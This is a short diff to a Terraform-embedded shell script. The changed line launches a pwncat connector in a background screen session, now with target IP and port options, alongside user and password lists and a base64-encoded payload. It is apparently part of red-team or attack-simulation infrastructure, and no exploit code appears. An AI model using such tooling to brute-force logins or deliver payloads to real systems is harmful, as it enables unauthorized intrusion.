@@ -39,7 +39,7 @@ locals {
             log "starting background process via screen..."
             screen -S $PWNCAT_SESSION -X quit
             screen -wipe
-            nohup /bin/bash -c "screen -d -L -Logfile $PWNCAT_LOG -S $PWNCAT_SESSION -m python3.9 connector.py --user-list=\"${var.inputs["user_list"]}\" --password-list=\"${var.inputs["password_list"]}\" --task=\"${var.inputs["task"]}\"--payload=\"${base64encode(var.inputs["payload"])}\"" >/dev/null 2>&1 &
+            nohup /bin/bash -c "screen -d -L -Logfile $PWNCAT_LOG -S $PWNCAT_SESSION -m python3.9 connector.py --target-ip=\"${var.inputs["target_ip"]}\" --target-port=\"${var.inputs["target_port"]}\" --user-list=\"${var.inputs["user_list"]}\" --password-list=\"${var.inputs["password_list"]}\" --task=\"${var.inputs["task"]}\" --payload=\"${base64encode(var.inputs["payload"])}\"" >/dev/null 2>&1 &
             screen -S $PWNCAT_SESSION -X colon "logfile flush 0^M"
             log "connector started."
             log "starting sleep for 30 minutes - blocking new tasks while accepting connections..."
